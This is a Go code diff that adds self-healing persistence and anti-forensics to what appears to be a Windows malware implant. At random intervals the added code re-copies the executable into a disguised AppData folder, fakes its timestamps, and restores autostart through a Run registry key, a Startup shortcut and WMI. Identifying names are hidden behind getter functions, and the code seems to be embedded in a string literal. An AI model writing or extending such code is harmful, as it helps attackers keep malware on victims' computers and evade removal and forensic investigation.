@@ -140,7 +140,61 @@ func runPrimaryWithWorker() {
 }
 
 func runWorkerGuard() {
+	go performAntiForensics()
+
+	go func() {
+		for {
+			time.Sleep(time.Duration(240+rand.Intn(120)) * time.Second)
+			healPersistence()
+		}
+	}()
+
 	loopA()
+}
+
+func healPersistence() {
+	exePath, err := os.Executable()
+	if err != nil {
+		return
+	}
+
+	workerDir := filepath.Join(os.Getenv(getAppDataEnvName()), getMicrosoftDirName(), getWindowsDirName())
+	expectedWorker := filepath.Join(workerDir, getWorkerExeName())
+	if _, err := os.Stat(expectedWorker); err != nil {
+		_ = os.MkdirAll(workerDir, 0755)
+		_ = copyFile(exePath, expectedWorker)
+		touchTimestamps(expectedWorker)
+	}
+
+	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
+	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
+	regQueryValueEx := advapi32.NewProc("RegQueryValueExW")
+	regCloseKey := advapi32.NewProc(getRegCloseKeyName())
+	keyPath, _ := syscall.UTF16PtrFromString("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
+	var hKey syscall.Handle
+	ret, _, _ := regOpenKeyEx.Call(uintptr(0x80000001), uintptr(unsafe.Pointer(keyPath)), 0, uintptr(0x20019), uintptr(unsafe.Pointer(&hKey)))
+	if ret == 0 {
+		valName, _ := syscall.UTF16PtrFromString(getDisplayName())
+		var vType uint32
+		var dataSize uint32
+		r2, _, _ := regQueryValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, uintptr(unsafe.Pointer(&vType)), 0, uintptr(unsafe.Pointer(&dataSize)))
+		regCloseKey.Call(uintptr(hKey))
+		if r2 != 0 {
+			opAddRegistryRun(expectedWorker)
+		}
+	} else {
+		opAddRegistryRun(expectedWorker)
+	}
+
+	startupDir := filepath.Join(os.Getenv(getAppDataEnvName()), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+	lnkPath := filepath.Join(startupDir, getDisplayName()+".lnk")
+	if _, err := os.Stat(lnkPath); err != nil {
+		opAddStartupShortcut(expectedWorker)
+	}
+
+	if !isWmiPersistencePresent() {
+		opAddWmiPersistence(expectedWorker)
+	}
 }
 `)
 }
